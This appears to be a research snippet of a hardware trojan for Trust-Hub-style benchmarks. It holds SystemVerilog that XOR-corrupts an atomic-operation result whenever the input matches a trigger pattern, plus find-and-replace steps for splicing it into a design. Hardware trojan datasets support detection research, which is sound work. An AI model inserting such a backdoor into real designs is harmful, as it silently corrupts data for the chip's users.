/**
 * Combinational Integrity Trojan - Code Snippet
 * 
 * Trust-Hub Category: Change Functionality ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
 * 
 * Description:
 *   Corrupts data when trigger condition met
 *   
 * Trigger: Pattern match on amo_op_i
 * Payload: Corrupt amo_result_o with XOR mask
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern
localparam logic [31:0] TRIGGER_PATTERN = 32'hBADF00D;

wire trojan_active;
assign trojan_active = (amo_op_i == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD: Data Corruption
// ============================================================

// Corruption mask for XOR operation
localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Integrity Violation: Corrupt amo_result_o with XOR
//
// Integration Script Must Modify:
//
// IF amo_result_o is assigned:
//   Find: assign amo_result_o = data_value;
//   Replace: assign amo_result_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF amo_result_o is output of always_comb:
//   Find: amo_result_o = data_value;
//   Replace: amo_result_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// Note: Adjust CORRUPTION_MASK width to match signal width if needed